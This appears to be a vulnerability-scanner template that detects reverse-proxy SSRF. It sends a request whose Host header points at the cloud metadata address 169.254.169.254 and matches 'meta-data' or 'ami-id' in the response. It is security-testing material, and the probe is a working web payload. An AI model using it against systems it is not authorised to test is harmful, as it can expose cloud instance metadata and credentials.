id: reverse-proxy-ssrf

info:
  name: Reverse Proxy SSRF
  severity: critical
  author: reewardius
  tags: ssrf,proxy,misconfig

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api"

    headers:
      Host: "169.254.169.254"

    matchers:
      - type: word
        words:
          - "meta-data"
          - "ami-id"
        condition: or
